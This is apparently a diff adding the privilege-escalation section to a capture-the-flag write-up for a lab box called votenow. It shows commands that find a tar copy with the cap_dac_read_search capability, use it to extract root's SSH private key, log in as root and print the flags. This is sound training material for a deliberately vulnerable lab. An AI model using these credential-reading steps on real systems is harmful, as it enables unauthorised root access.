@@ -237,6 +237,65 @@ Last login: Sun Jun 28 00:42:34 BST 2020 on pts/0
 [admin@votenow ~]$ 
 ```
 
+## admin -> root
+
+Now privesc to root is simple, we have to exploit system capabilities.
+
+Linux capabilities are similar to SUID, we can limite user’s permission and much more. Let's start by scanning the file system for files with capabilities.
+
+```
+[admin@votenow ~]$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/tarS = cap_dac_read_search+ep
+```
+
+`tarS` seems perfect.. it has the `cap_dac_read_search` capability. We can bypass file read permission checks so we can read whatever file we want. ;) Let's read the root's SSH private key.
+
+```
+[admin@votenow tmp]$ tarS -cvf key.tar /root/.ssh/id_rsa
+tarS -cvf key.tar /root/.ssh/id_rsa
+tarS: Removing leading `/' from member names
+/root/.ssh/id_rsa
+[admin@votenow tmp]$ tar -xvf key.tar
+tar -xvf key.tar
+root/.ssh/id_rsa
+[admin@votenow tmp]$ cd root/.ssh
+cd root/.ssh
+[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
+ssh -i id_rsa root@localhost -p 2082
+Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
+[root@votenow ~]# whoami;id
+whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Let's read the flags:
+
+```
+[root@votenow ~]# cat root-final-flag.txt
+cat root-final-flag.txt
+Congratulations on getting root.
+
+ _._     _,-'""`-._
+(,-.`._,'(       |\`-/|
+    `-.-' \ )-`( , o o)
+          `-    \`_`"'-
+
+This CTF was created by bootlesshacker - https://security.caerdydd.wales
+
+Please visit my blog and provide feedback - I will be glad to hear from you.
+[root@votenow ~]# cat /home/admin/user.txt
+cat /home/admin/user.txt
+663ba6a402a57536772c6118e8181570
+```
+
+That was an amazing box! :)
+
+
 
 
 
